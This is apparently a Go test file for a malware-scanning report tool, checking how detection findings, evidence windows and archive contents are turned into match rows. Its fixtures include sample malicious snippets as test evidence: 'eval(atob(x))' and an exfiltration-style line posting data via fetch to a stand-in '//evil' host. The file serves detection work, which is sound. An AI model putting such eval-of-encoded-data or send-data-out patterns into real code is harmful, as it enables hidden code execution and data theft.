package main

import (
	"strings"
	"testing"
)

// findMatches locates an aggregated trait by its display ID (dirPath form)
// across all category groups and returns its match rows.
func findMatches(t *testing.T, cats []CategoryGroup, id string) []FindingMatch {
	t.Helper()
	for _, g := range cats {
		for _, f := range g.Findings {
			if f.ID == id {
				return f.Matches
			}
		}
	}
	t.Fatalf("trait %q not found in %+v", id, cats)
	return nil
}

// TestContextProvidesEvidence locks in the v7 path: findings carry no inline
// `ev`, evidence comes from the file's `ctx` array keyed by full trait ID.
// A binary (hex) window yields a row with a 0x-formatted offset and no
// syntax-highlight tokens.
func TestContextProvidesEvidence(t *testing.T) {
	files := []cleaveFile{{
		Path:     "ext.crx",
		FileType: "crx",
		Depth:    0,
		Findings: []finding{
			{ID: "objectives/execution/interpreter/eval::dynamic", Crit: 3, Conf: 0.9, Desc: "dynamic eval"},
		},
		Ctx: []contextWindow{{
			Offset: 88,
			Hex:    true,
			Text:   "ea fb 32 d5  ..2.",
			Notes:  []contextNote{{ID: "objectives/execution/interpreter/eval::dynamic", Offset: 107, Crit: 3}},
		}},
	}}

	got := buildStructuredFindings(files)
	if len(got) != 1 {
		t.Fatalf("expected findings for one file, got %d", len(got))
	}
	m := findMatches(t, got[0].Categories, "execution/interpreter")
	if len(m) != 1 {
		t.Fatalf("expected one match from ctx, got %d: %+v", len(m), m)
	}
	if m[0].Evidence != "ea fb 32 d5  ..2." {
		t.Errorf("evidence = %q, want the ctx window text", m[0].Evidence)
	}
	if m[0].Location != "0x6b" {
		t.Errorf("location = %q, want hex offset 0x6b (107)", m[0].Location)
	}
	if m[0].Tokens != nil {
		t.Errorf("hex evidence should not be syntax-highlighted, got %d tokens", len(m[0].Tokens))
	}
}

// TestInlineEvidenceFallback confirms older reports — inline `ev`, no `ctx` —
// still produce expandable match rows, highlighted by the source filename.
func TestInlineEvidenceFallback(t *testing.T) {
	files := []cleaveFile{{
		Path:     "payload.js",
		FileType: "javascript",
		Depth:    0,
		Findings: []finding{
			{ID: "objectives/execution/interpreter/eval::call", Crit: 3, Conf: 0.9, Desc: "eval", Evidence: []string{"eval(atob(x))"}},
		},
	}}

	got := buildStructuredFindings(files)
	m := findMatches(t, got[0].Categories, "execution/interpreter")
	if len(m) != 1 {
		t.Fatalf("expected one inline match, got %d", len(m))
	}
	if m[0].Evidence != "eval(atob(x))" {
		t.Errorf("evidence = %q, want inline ev", m[0].Evidence)
	}
	if len(m[0].Tokens) == 0 {
		t.Error("a .js evidence string should be syntax-highlighted")
	}
}

// TestContextPreferredOverInline ensures that when a finding has both ctx
// attribution and stale inline evidence, ctx wins (the newer, richer source).
func TestContextPreferredOverInline(t *testing.T) {
	files := []cleaveFile{{
		Path:     "a.js",
		FileType: "javascript",
		Depth:    0,
		Findings: []finding{{
			ID: "objectives/exfiltration/http::post", Crit: 3, Conf: 0.9, Desc: "post",
			Evidence: []string{"STALE"},
		}},
		Ctx: []contextWindow{{
			Offset: 12,
			Text:   "fetch('//evil', {method:'POST'})",
			Notes:  []contextNote{{ID: "objectives/exfiltration/http::post", Offset: 12}},
		}},
	}}

	got := buildStructuredFindings(files)
	m := findMatches(t, got[0].Categories, "exfiltration")
	if len(m) != 1 {
		t.Fatalf("expected one match, got %d", len(m))
	}
	if strings.Contains(m[0].Evidence, "STALE") {
		t.Errorf("inline evidence should be shadowed by ctx, got %q", m[0].Evidence)
	}
	if m[0].Location != "12" {
		t.Errorf("location = %q, want decimal offset 12 for a text window", m[0].Location)
	}
}

// TestArchiveContextEvidence confirms the archive aggregation path reads ctx
// from inner files and attributes rows to the inner file's name.
func TestArchiveContextEvidence(t *testing.T) {
	containerSHA := strings.Repeat("a", 64)
	innerSHA := strings.Repeat("b", 64)
	files := []cleaveFile{
		{Path: "bundle.zip", SHA256: containerSHA, Depth: 0},
		{
			Path: "bundle.zip!!pkg/index.js", SHA256: innerSHA, FileType: "javascript", Depth: 1,
			Findings: []finding{{ID: "objectives/execution/interpreter/eval::call", Crit: 3, Conf: 0.9, Desc: "eval"}},
			Ctx: []contextWindow{{
				Offset: 40,
				Text:   "eval(s)",
				Notes:  []contextNote{{ID: "objectives/execution/interpreter/eval::call", Offset: 40}},
			}},
		},
	}

	cats, _, _ := aggregateArchiveCategories(files)
	m := findMatches(t, cats, "execution/interpreter")
	if len(m) != 1 {
		t.Fatalf("expected one ctx match, got %d: %+v", len(m), m)
	}
	if m[0].Filename != "index.js" {
		t.Errorf("filename = %q, want index.js", m[0].Filename)
	}
	if m[0].Evidence != "eval(s)" || m[0].Location != "40" {
		t.Errorf("got evidence=%q location=%q, want eval(s)/40", m[0].Evidence, m[0].Location)
	}
}
